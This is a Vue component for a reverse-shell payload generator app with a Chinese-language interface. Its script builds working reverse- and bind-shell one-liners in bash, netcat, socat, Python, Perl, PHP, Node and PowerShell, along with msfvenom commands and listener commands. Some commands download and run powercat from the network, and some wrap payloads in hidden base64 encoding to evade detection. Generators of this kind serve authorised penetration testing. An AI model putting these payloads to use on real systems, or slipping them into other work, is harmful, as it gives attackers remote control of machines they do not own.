<script setup lang="ts">
import { ref, computed, watch } from "vue";
 

const lhost = ref("192.168.1.1");
const lport = ref(4444);
const listenerKind = ref("netcat");
const encoding = ref("none");
const theme = ref("auto");
const copyStatus = ref<"none"|"ok"|"fail">("none");
const osFilter = ref("all");
const searchText = ref("");
const selectedPayloadKey = ref("bash_i");
const errorHost = ref("");
const errorPort = ref("");
const activeTab = ref("reverse");
const shellPath = ref("/bin/bash");
const shellOptions = [
  "sh",
  "/bin/sh",
  "bash",
  "/bin/bash",
  "zsh",
  "ksh",
  "dash",
  "cmd",
  "powershell",
  "pwsh",
];


const payloads = [
  { key: "bash_i", name: "Bash -i", os: "linux" },
  { key: "bash_196", name: "Bash 196", os: "linux" },
  { key: "bash_udp", name: "Bash UDP", os: "linux" },
  { key: "nc_mkfifo", name: "nc mkfifo", os: "linux" },
  { key: "nc_e", name: "nc -e", os: "linux" },
  { key: "busybox_nc_e", name: "BusyBox nc -e", os: "linux" },
  { key: "ncat_e", name: "ncat -e", os: "linux" },
  { key: "nc_openbsd_fifo", name: "nc OpenBSD FIFO", os: "linux" },
  { key: "socat_tty", name: "socat TTY", os: "linux" },
  { key: "python_pty", name: "Python pty", os: "linux" },
  { key: "perl_sh", name: "Perl /bin/sh", os: "linux" },
  { key: "php_sh", name: "PHP /bin/sh", os: "linux" },
  { key: "node_sh", name: "Node.js /bin/sh", os: "linux" },
  { key: "powershell_tcp", name: "PowerShell TCP", os: "windows" },
  { key: "ncat_windows", name: "ncat.exe -e cmd", os: "windows" },
  { key: "nc_exe_windows", name: "nc.exe -e cmd", os: "windows" },
  { key: "powercat_windows", name: "powercat", os: "windows" },
  { key: "bash_mac", name: "Mac Bash -i", os: "mac" },
];

const bindPayloads = [
  { key: "bind_python3", name: "Python3 Bind", os: "linux" },
  { key: "bind_php", name: "PHP Bind", os: "linux" },
  { key: "bind_nc", name: "nc Bind", os: "linux" },
  { key: "bind_perl", name: "Perl Bind", os: "linux" },
];

const msfPayloads = [
  { key: "msf_linux_x64_shell", name: "linux/x64/shell_reverse_tcp", os: "linux" },
  { key: "msf_linux_x86_shell", name: "linux/x86/shell_reverse_tcp", os: "linux" },
  { key: "msf_windows_x64_shell", name: "windows/x64/shell_reverse_tcp", os: "windows" },
  { key: "msf_windows_x64_meterpreter", name: "windows/x64/meterpreter_reverse_tcp", os: "windows" },
  { key: "msf_osx_x64_shell", name: "osx/x64/shell_reverse_tcp", os: "mac" },
];

const hostValid = computed(() => /^(\d{1,3}\.){3}\d{1,3}$/.test(String(lhost.value || "").trim()));
const portValid = computed(() => { const p = Number(lport.value); return p >= 1 && p <= 65535; });


function validateInputs() {
  errorHost.value = "";
  errorPort.value = "";
  const host = String(lhost.value || "").trim();
  const portNum = Number(lport.value);
  let ok = true;
  if (!host) { errorHost.value = "请输入监听主机"; ok = false; }
  if (!portNum || portNum < 1 || portNum > 65535) { errorPort.value = "请输入有效端口(1-65535)"; ok = false; }
  return ok;
}

const connectCommand = computed(() => {
  if (!validateInputs()) return "";
  const host = String(lhost.value).trim();
  const portNum = Number(lport.value);
  let raw = "";
  if (activeTab.value === "reverse") {
    raw = genPayloadByKey(selectedPayloadKey.value, host, portNum, shellPath.value);
    if (!raw) return "";
    return postProcessByEncoding(raw, encoding.value, selectedPayloadKey.value);
  } else if (activeTab.value === "bind") {
    raw = genBindByKey(selectedPayloadKey.value, portNum, shellPath.value);
    return raw;
  } else if (activeTab.value === "msfvenom") {
    raw = genMsfByKey(selectedPayloadKey.value, host, portNum);
    return raw;
  } else {
    return "";
  }
});


const listenerCommand = computed(() => {
  if (!validateInputs()) return "";
  return localGenerateListener(Number(lport.value), listenerKind.value);
});

const connectCommandHtml = computed(() => {
  const c = connectCommand.value;
  if (!c) return "";
  return highlight(c);
});

const listenerCommandHtml = computed(() => {
  const c = listenerCommand.value;
  if (!c) return "";
  return highlight(c);
});

const ipPortHtml = computed(() => {
  const host = String(lhost.value || "").trim();
  const port = String(lport.value || "").trim();
  return highlight(`LHOST=${host} LPORT=${port}`);
});


function addRipple(e: MouseEvent) {
  const target = e.currentTarget as HTMLElement;
  if (!target) return;
  const rect = target.getBoundingClientRect();
  const size = Math.max(rect.width, rect.height);
  const ripple = document.createElement("span");
  ripple.className = "ripple";
  ripple.style.width = `${size}px`;
  ripple.style.height = `${size}px`;
  ripple.style.left = `${(e.clientX - rect.left)}px`;
  ripple.style.top = `${(e.clientY - rect.top)}px`;
  target.appendChild(ripple);
  setTimeout(() => ripple.remove(), 500);
}

function onSelectPayload(key: string, e: MouseEvent) {
  selectedPayloadKey.value = key;
  addRipple(e);
}

function firstKeyForTab(tab: string): string {
  if (tab === "bind") return bindPayloads[0]?.key || "";
  if (tab === "msfvenom") return msfPayloads[0]?.key || "";
  return payloads[0]?.key || "";
}

watch(activeTab, (tab) => {
  selectedPayloadKey.value = firstKeyForTab(tab);
});

async function copyText(text: string) {
  try {
    if ((navigator as any).clipboard?.writeText) {
      await (navigator as any).clipboard.writeText(text);
      return true;
    }
  } catch (_) {}
  try {
    const mod: any = await import("@tauri-apps/api/clipboard");
    if (mod?.writeText) { await mod.writeText(text); return true; }
  } catch (_) {}
  try {
    const ta = document.createElement("textarea");
    ta.value = text;
    ta.style.position = "fixed";
    ta.style.opacity = "0";
    document.body.appendChild(ta);
    ta.focus(); ta.select();
    document.execCommand("copy");
    ta.remove();
    return true;
  } catch (_) { return false; }
}

async function copy() {
  if (!connectCommand.value) return;
  const ok = await copyText(connectCommand.value);
  copyStatus.value = ok ? "ok" : "fail";
  setTimeout(() => { copyStatus.value = "none"; }, 1500);
}

async function copyListener() {
  if (!listenerCommand.value) return;
  const ok = await copyText(listenerCommand.value);
  copyStatus.value = ok ? "ok" : "fail";
  setTimeout(() => { copyStatus.value = "none"; }, 1500);
}


 

function utf16LeBytes(str: string): Uint8Array {
  const out = new Uint8Array(str.length * 2);
  for (let i = 0; i < str.length; i++) {
    const code = str.charCodeAt(i);
    out[i * 2] = code & 0xff;
    out[i * 2 + 1] = (code >> 8) & 0xff;
  }
  return out;
}

function applyTheme() {
  document.documentElement.setAttribute("data-theme", theme.value);
}

function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function highlight(cmd: string): string {
  let s = escapeHtml(cmd);
  s = s.replace(/\/(?:bin|usr|sbin)[^\s<]*/g, '<span class="path">$&</span>');
  s = s.replace(/\b(sudo|echo|base64|LHOST|LPORT|msfvenom|msfconsole|nc|ncat|rcat|bash|sh|python3|python|perl|php|node|nodejs|socat|openssl|pwncat|powercat|powershell|pwsh)\b/g, '<span class="kw">$1</span>');
  s = s.replace(/\b\d{1,3}(?:\.\d{1,3}){3}\b/g, '<span class="host">$&</span>');
  s = s.replace(/(^|\s)(-[-\w]+)/g, '$1<span class="flag">$2</span>');
  s = s.replace(/\b\d{2,5}\b/g, '<span class="num">$&</span>');
  s = s.replace(/%[0-9A-Fa-f]{2}/g, '<span class="pct">$&</span>');
  return `<span class="hl">${s}</span>`;
}

function localGenerateListener(port: number, kind: string): string {
  const k = kind.toLowerCase();
  switch (k) {
    case "netcat":
    case "nc":
      return `sudo nc -lvnp ${port}`;
    case "nc_freebsd":
      return `sudo nc -l -p ${port}`;
    case "ncat":
      return `sudo ncat -lvnp ${port}`;
    case "ncat_exe":
      return `ncat.exe -lvnp ${port}`;
    case "ncat_tls":
      return `sudo ncat --ssl -lvnp ${port}`;
    case "rlwrap_nc":
      return `sudo rlwrap -cAr nc -lvnp ${port}`;
    case "netcat_busybox":
      return `sudo busybox nc -l -p ${port}`;
    case "netcat_openbsd":
      return `sudo nc -lvn ${port}`;
    case "rustcat":
      return `sudo rcat listen ${port}`;
    case "openssl":
      return `sudo openssl s_server -quiet -key server.key -cert server.crt -accept ${port}`;
    case "pwncat":
      return `sudo pwncat -lp ${port}`;
    case "pwncat_windows":
      return `pwncat -lp ${port} --platform windows`;
    case "windows_conpty":
      return `ncat.exe -lvnp ${port}`;
    case "socat":
      return `sudo socat TCP-LISTEN:${port},fork,reuseaddr`;
    case "socat_tty":
      return `sudo socat -d -d TCP-LISTEN:${port},reuseaddr,fork PTY,raw,echo=0`;
    case "powercat":
      return `powershell -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -l -p ${port}"`;
    case "msfconsole":
      return `sudo msfconsole -q -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${port}; run -j\"`;
    default:
      return `sudo nc -lvnp ${port}`;
  }
}

function listPayloads() {
  const t = searchText.value.toLowerCase();
  const source = activeTab.value === "bind" ? bindPayloads : activeTab.value === "msfvenom" ? msfPayloads : payloads;
  return source.filter(p => (osFilter.value === "all" || p.os === osFilter.value) && (t === "" || p.name.toLowerCase().includes(t)));
}

function genPayloadByKey(key: string, host: string, port: number, shell: string): string {
  switch (key) {
    case "bash_i":
      return `bash -c 'bash -i >& /dev/tcp/${host}/${port} 0>&1'`;
    case "bash_196":
      return `bash -c 'exec 196<>/dev/tcp/${host}/${port}; /bin/sh <&196 >&196 2>&196'`;
    case "bash_udp":
      return `bash -c 'bash -i >& /dev/udp/${host}/${port} 0>&1'`;
    case "nc_mkfifo":
      return `rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | ${shell} -i 2>&1 | nc ${host} ${port} > /tmp/p`;
    case "nc_e":
      return `nc -e ${shell} ${host} ${port}`;
    case "busybox_nc_e":
      return `busybox nc -e ${shell} ${host} ${port}`;
    case "ncat_e":
      return `ncat -e ${shell} ${host} ${port}`;
    case "nc_openbsd_fifo":
      return `rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | ${shell} -i 2>&1 | nc ${host} ${port} > /tmp/p`;
    case "socat_tty":
      return `socat TCP:${host}:${port} EXEC:${shell},pty,stderr,setsid,sigint,sane`;
    case "python_pty":
      return `python3 -c "import os,pty,socket; s=socket.socket(); s.connect(('${host}',${port})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('${shell}')"`;
    case "perl_sh":
      return `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");}'`;
    case "php_sh":
      return `php -r '$s=fsockopen("${host}",${port});proc_open("${shell} -i",[0=>$s,1=>$s,2=>$s],$pipes);'`;
    case "node_sh":
      return `node -e "const net=require('net'),cp=require('child_process');const client=new net.Socket();client.connect(${port},'${host}',()=>{const sh=cp.spawn('${shell}',['-i']);sh.stdout.pipe(client);sh.stderr.pipe(client);client.pipe(sh.stdin);});"`;
    case "powershell_tcp":
      return `powershell -NoP -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('${host}',${port});$stream=$client.GetStream();[byte[]]$buffer=New-Object byte[] 1024;while(($i=$stream.Read($buffer,0,$buffer.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$bytearray=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($sendback2);$stream.Write($bytearray,0,$bytearray.Length);$stream.Flush()};$client.Close()"`;
    case "ncat_windows":
      return `ncat.exe -e cmd.exe ${host} ${port}`;
    case "nc_exe_windows":
      return `nc.exe -e cmd.exe ${host} ${port}`;
    case "powercat_windows":
      return `powershell -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ${host} -p ${port} -e cmd"`;
    case "bash_mac":
      return `/bin/bash -i >& /dev/tcp/${host}/${port} 0>&1`;
    default:
      return "";
  }
}

function genBindByKey(key: string, port: number, shell: string): string {
  switch (key) {
    case "bind_python3":
      return `python3 -c "import socket,os,pty;s=socket.socket();s.bind(('0.0.0.0',${port}));s.listen(1);c,addr=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];pty.spawn('${shell}')"`;
    case "bind_php":
      return `php -r "$s=stream_socket_server('tcp://0.0.0.0:${port}');$c=stream_socket_accept($s);proc_open('${shell} -i',[0=>$c,1=>$c,2=>$c],$pipes);"`;
    case "bind_nc":
      return `mkfifo /tmp/p; ${shell} -i </tmp/p 2>&1 | nc -lvp ${port} >/tmp/p`;
    case "bind_perl":
      return `perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in(${port},INADDR_ANY));listen(S,5);for(;$c=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("${shell} -i");}}'`;
    default:
      return "";
  }
}

function genMsfByKey(key: string, host: string, port: number): string {
  switch (key) {
    case "msf_linux_x64_shell":
      return `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${host} LPORT=${port} -f elf -o shell.elf`;
    case "msf_linux_x86_shell":
      return `msfvenom -p linux/x86/shell_reverse_tcp LHOST=${host} LPORT=${port} -f elf -o shell.elf`;
    case "msf_windows_x64_shell":
      return `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${host} LPORT=${port} -f exe -o shell.exe`;
    case "msf_windows_x64_meterpreter":
      return `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${host} LPORT=${port} -f exe -o meterpreter.exe`;
    case "msf_osx_x64_shell":
      return `msfvenom -p osx/x64/shell_reverse_tcp LHOST=${host} LPORT=${port} -f macho -o shell.macho`;
    default:
      return "";
  }
}


function postProcessByEncoding(cmd: string, enc: string, key: string): string {
  let out = cmd;
  if (enc === "base64") {
    if (key.startsWith("powershell") || key.includes("windows")) {
      const bytes = utf16LeBytes(out);
      const bin = String.fromCharCode(...bytes);
      const b = btoa(bin);
      out = `powershell -NoP -W Hidden -Exec Bypass -enc ${b}`;
    } else {
      const b = btoa(out);
      out = `echo ${b} | base64 -d | bash`;
    }
  } else if (enc === "url") {
    out = encodeURIComponent(out);
  }
  return out;
}
</script>

<template>
  <main class="container">
    <h1>Reverse-Shell-Tools</h1>

    <div class="top-cards">
      <div class="card">
        <div class="card-title">IP & Port</div>
        <div class="grid2">
          <div class="field">
            <label>IP</label>
            <input class="ip-input" :class="{ ok: hostValid }" v-model="lhost" placeholder="92.168.1.1" />
            <div class="error" v-if="errorHost">{{ errorHost }}</div>
          </div>
          <div class="field">
            <label>Port</label>
            <div class="port-row">
              <input class="port-input" :class="{ ok: portValid }" type="number" v-model="lport" />
            </div>
            <div class="error" v-if="errorPort">{{ errorPort }}</div>
          </div>
        </div>
        <div class="code-block mini" v-html="ipPortHtml"></div>
      </div>
      <div class="card">
        <div class="card-title">Listener</div>
        <div class="field">
          <label>Type</label>
          <select v-model="listenerKind">
            <option value="netcat">nc</option>
            <option value="nc_freebsd">nc freebsd</option>
            <option value="netcat_busybox">busybox nc</option>
            <option value="ncat">ncat</option>
            <option value="ncat_exe">ncat.exe</option>
            <option value="ncat_tls">ncat (TLS)</option>
            <option value="rlwrap_nc">rlwrap + nc</option>
            <option value="rustcat">rustcat</option>
            <option value="openssl">openssl</option>
            <option value="pwncat">pwncat</option>
            <option value="pwncat_windows">pwncat (windows)</option>
            <option value="windows_conpty">windows ConPty</option>
            <option value="socat">socat</option>
            <option value="socat_tty">socat (TTY)</option>
            <option value="powercat">powercat</option>
            <option value="msfconsole">msfconsole</option>
          </select>
        </div>
        <div class="code-block" :class="{ empty: !listenerCommand }" v-html="listenerCommandHtml || '监听端命令将在此显示'"></div>
        <div class="actions">
          <button class="btn btn-md" type="button" @click="copyListener" :disabled="!listenerCommand">复制</button>
        </div>
      </div>
    </div>

    <div class="toolbar">
      <div class="left">
        <span class="tab" :class="{ active: activeTab==='reverse' }" @click="activeTab='reverse'">Reverse</span>
        <span class="tab" :class="{ active: activeTab==='bind' }" @click="activeTab='bind'">Bind</span>
        <span class="tab" :class="{ active: activeTab==='msfvenom' }" @click="activeTab='msfvenom'">MSFVenom</span>
      </div>
      <div class="right">
        <label class="opt">
          主题
          <select v-model="theme" @change="applyTheme">
            <option value="auto">自动</option>
            <option value="light">浅色</option>
            <option value="dark">深色</option>
          </select>
        </label>
      </div>
    </div>

    <div class="generator-panel">
      <div class="panel">
        <div class="filterbar wide">
          <div class="filterbar-left">
            <label class="label">OS</label>
            <select v-model="osFilter">
              <option value="all">All</option>
              <option value="linux">Linux</option>
              <option value="windows">Windows</option>
              <option value="mac">Mac</option>
            </select>
            <label class="label">Name</label>
            <input v-model="searchText" placeholder="搜索..." />
          </div>
        </div>
        <div class="content">
          <div class="payload-sidebar">
            <div class="payload-list">
              <button
                v-for="p in listPayloads()"
                :key="p.key"
                class="payload-item"
                :class="{ active: selectedPayloadKey === p.key }"
                @click="onSelectPayload(p.key, $event)"
              >{{ p.name }}</button>
            </div>
          </div>
          <div class="payload-preview">
            <div class="panel-inner">
              <div class="panel-title">命令 <span v-if="encoding!=='none'" class="badge" :class="encoding==='url' ? 'enc-url' : 'enc-b64'">{{ encoding==='url' ? 'URL' : 'Base64' }}</span></div>
              <div class="code-block" :class="[{ empty: !connectCommand }, encoding!=='none' ? 'encoded' : '']" v-html="connectCommandHtml || '生成的命令将在此显示'"></div>
              <div class="actions">
                <template v-if="activeTab==='reverse'">
                  <div class="controls-row">
                    <div class="control">
                      Shell
                      <select v-model="shellPath">
                        <option v-for="s in shellOptions" :key="s" :value="s">{{ s }}</option>
                      </select>
                    </div>
                    <div class="control">
                      Encoding
                      <select v-model="encoding">
                        <option value="none">None</option>
                        <option value="url">URL</option>
                        <option value="base64">Base64</option>
                      </select>
                    </div>
                  </div>
                </template>
                <div class="button-row">
                  <button class="btn btn-md" type="button" @click="copy" :disabled="!connectCommand">复制</button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>
  <div class="toast-global" v-if="copyStatus!=='none'" :class="copyStatus==='ok' ? 'toast-ok' : 'toast-fail'">{{ copyStatus==='ok' ? '已复制到剪贴板' : '复制失败' }}</div>
  
</template>

<style scoped>
.container { max-width: 1280px; margin: 0 auto; padding: 24px; color: var(--text); }
.top-cards { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 8px; margin-bottom: 14px; align-items: stretch; }
.card { border: 1px solid var(--card-border); border-radius: 12px; padding: 16px; background: var(--card-bg); box-shadow: 0 2px 6px rgba(0,0,0,0.04); height: 100%; }
.card-title { font-weight: 700; margin-bottom: 10px; }
.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
.port-row { display: flex; gap: 8px; align-items: center; }
.port-row .port-input { flex: 1; min-width: 0; box-sizing: border-box; }
/* removed plus button style */
.btn { display: inline-flex; align-items: center; justify-content: center; border: 1px solid var(--card-border); background: var(--card-bg); border-radius: 8px; position: relative; overflow: hidden; white-space: nowrap; box-sizing: border-box; -webkit-font-smoothing: antialiased; }
.btn-md { height: 36px; width: 72px; flex: 0 0 72px; padding: 0 12px; font-size: 15px; line-height: 36px; }
.btn-lg { height: 40px; min-width: 96px; padding: 0 16px; font-size: 16px; }
button.btn:hover { border-color: var(--accent); }
.generator-panel { margin-top: 16px; }
.filterbar { display: flex; gap: 8px; margin-bottom: 12px; align-items: center; }
.filterbar.wide { justify-content: space-between; padding: 8px 8px; background: var(--code-bg); border: 1px solid var(--code-border); border-radius: 10px; }
.filterbar-left { display: flex; gap: 10px; align-items: center; }
.filterbar select { width: 120px; }
.filterbar input { width: 200px; }
.filterbar .label { color: var(--muted); font-size: 14px; }
.content { display: grid; grid-template-columns: 320px 1fr; gap: 16px; align-items: stretch; }
.payload-preview .panel-inner { height: 100%; display: flex; flex-direction: column; }
.payload-preview .actions { margin-top: auto; }
.panel-inner { border: 1px solid var(--card-border); border-radius: 10px; padding: 12px; background: var(--card-bg); }
.field { display: grid; gap: 6px; }
.actions { display: flex; gap: 8px; margin-top: 8px; }
.controls-row { display: flex; gap: 12px; margin-bottom: 8px; }
.control select { margin-left: 8px; }
.button-row { display: flex; gap: 8px; }
label { font-size: 1em; color: var(--text); font-weight: 600; }
input, select, button { border-radius: 8px; border: 1px solid var(--input-border); padding: 12px 14px; font-size: 15px; background: var(--input-bg); color: var(--text); }
button, .btn, .tab { color: var(--control-text); font-weight: 500; }
button:disabled { opacity: 0.6; cursor: not-allowed; }
button { cursor: pointer; background: var(--card-bg); }
button:hover { border-color: var(--accent); }
.code-block { width: 100%; margin-top: 8px; margin-bottom: 10px; border: 1px solid var(--code-border); border-radius: 10px; background: var(--code-bg); padding: 12px 14px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; white-space: pre-wrap; word-break: break-word; min-height: 140px; max-height: 240px; overflow: auto; color: var(--text); box-shadow: none; box-sizing: border-box; }
.card .code-block { border: none; box-shadow: none; background: var(--code-bg); border-radius: 8px; }
.code-block.empty { color: var(--muted); }
.code-block .hl { display: block; line-height: 1.7; letter-spacing: 0.2px; }
.code-block .pct { color: var(--pct-color); }
.container { font-weight: 500; }
.panel-title { font-weight: 700; }
.code-block.mini { min-height: 44px; }
.ip-input.ok { border-color: var(--host-accent); color: var(--host-accent); }
.port-input.ok { border-color: var(--port-accent); color: var(--port-accent); }
.code-block.encoded { border-color: var(--accent); }
.panel { border: 1px solid var(--card-border); border-radius: 12px; padding: 12px; background: var(--card-bg); }
.panel-inner { border: none; border-radius: 8px; padding: 0; background: transparent; }
.panel-title { font-weight: 700; margin-bottom: 6px; }
.badge { display: inline-block; margin-left: 8px; padding: 2px 8px; border-radius: 999px; font-size: 12px; line-height: 18px; vertical-align: middle; }
.badge.enc-url { background: var(--enc-url-bg); color: var(--enc-url-text); border: 1px solid var(--enc-url-border); }
.badge.enc-b64 { background: var(--enc-b64-bg); color: var(--enc-b64-text); border: 1px solid var(--enc-b64-border); }
.payload-sidebar { border: none; border-radius: 8px; padding: 4px 0 0 0; background: transparent; }
.filter { display: flex; gap: 8px; margin-bottom: 8px; }
.payload-list { display: grid; gap: 6px; max-height: calc(100vh - 360px); overflow: auto; padding-right: 6px; }
.payload-item { position: relative; overflow: hidden; text-align: left; border: 1px solid var(--card-border); border-radius: 8px; padding: 8px 10px 8px 28px; cursor: pointer; color: var(--text); }
.payload-item { background: var(--sidebar-item-bg); }
.payload-item:hover { background: var(--sidebar-item-bg-hover); }
.payload-item::before { content: ""; position: absolute; left: 10px; top: 50%; transform: translateY(-50%); width: 10px; height: 10px; border-radius: 50%; border: 2px solid var(--accent); background: transparent; }
.ripple { position: absolute; border-radius: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.15); animation: ripple 500ms ease-out; pointer-events: none; }
@keyframes ripple { from { width: 0; height: 0; opacity: 0.35; } to { width: 200px; height: 200px; opacity: 0; } }
.payload-item.active { border-color: var(--accent); background: var(--sidebar-item-bg-active); }
.payload-item.active::before { background: var(--accent); }
.error { color: #d0302f; font-size: 13px; margin-top: 4px; }
:root[data-theme="dark"] .error { color: #ff7676; }
.toolbar { display: flex; justify-content: space-between; align-items: center; margin-top: 24px; padding: 8px; background: var(--code-bg); border: 1px solid var(--code-border); border-radius: 10px; position: relative; z-index: 2; }
.tab { display: inline-flex; align-items: center; padding: 8px 12px; border-radius: 8px; background: var(--code-bg); margin-right: 8px; color: var(--text); position: relative; overflow: hidden; }
.tab.active { background: var(--accent); color: #0b1a13; }
.opt { display: inline-flex; align-items: center; gap: 6px; margin-left: 8px; }
.toast-global { position: fixed; top: 16px; left: 50%; transform: translateX(-50%); padding: 8px 12px; border-radius: 8px; font-size: 13px; box-shadow: 0 6px 18px rgba(0,0,0,0.25); z-index: 9999; pointer-events: none; }
.toast-ok { background: #1f6d4a; color: #e8fff6; border: 1px solid #2f8e63; }
.toast-fail { background: #6d1f1f; color: #ffe8e8; border: 1px solid #8e2f2f; }
</style>
<style>
:root {
  --bg: #eef7f6;
  --text: #0e0e10;
  --muted: #60646c;
  --card-bg: #fbfffd;
  --card-border: #cfe8da;
  --input-bg: #f6fbf8;
  --input-border: #cfe8da;
  --code-bg: #eaf4fa;
  --code-border: #cfe1ee;
  --accent: #34c759;
  --control-text: var(--text);
  --sidebar-item-bg: #f3faf6;
  --sidebar-item-bg-hover: #eaf6f0;
  --sidebar-item-bg-active: #e2f4ec;
  --enc-url-bg: #e2f4ec;
  --enc-url-text: #0e0e10;
  --enc-url-border: #cfe8da;
  --enc-b64-bg: #e9f0ff;
  --enc-b64-text: #0e0e10;
  --enc-b64-border: #c9d3ff;
  --pct-color: #6b7280;
  --host-accent: #0bb788;
  --port-accent: #ea7d00;
  font-family: Inter, Avenir, Helvetica, Arial, sans-serif;
  font-size: 17px;
  line-height: 26px;
  font-weight: 400;
  color: var(--text);
  background-color: var(--bg);
  background-image: linear-gradient(180deg, #eaf7fb 0%, #eef7f6 30%, #eff9f4 100%);
}

:root[data-theme="dark"] {
  --bg: #0f1516;
  --text: #cfeee0;
  --muted: #b9d0c6;
  --card-bg: #151d19;
  --card-border: #26332b;
  --input-bg: #151d18;
  --input-border: #2a3a31;
  --code-bg: #12222a;
  --code-border: #1f2f38;
  --accent: #55d39f;
  --host-accent: #58e3b4;
  --port-accent: #ffb36a;
  --control-text: #cfeee0;
  --sidebar-item-bg: #16231c;
  --sidebar-item-bg-hover: #1a2a23;
  --sidebar-item-bg-active: #1e3027;
  --enc-url-bg: #183126;
  --enc-url-text: #cfeee0;
  --enc-url-border: #264636;
  --enc-b64-bg: #182133;
  --enc-b64-text: #cfeee0;
  --enc-b64-border: #2b3850;
  --pct-color: #a3aab5;
  color: var(--text);
  background-color: var(--bg);
  background-image: linear-gradient(180deg, #0e151a 0%, #101a17 40%, #0f1715 100%);
}

@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
    color: var(--text);
    background-color: var(--bg);
  }
}

.code-block .kw { color: var(--accent); font-weight: 700; }
.code-block .host { color: var(--host-accent); font-weight: 700; }
.code-block .num { color: var(--port-accent); }
.code-block .flag { color: #8a5cf5; }
.code-block .path { color: #17a2ff; }
</style>
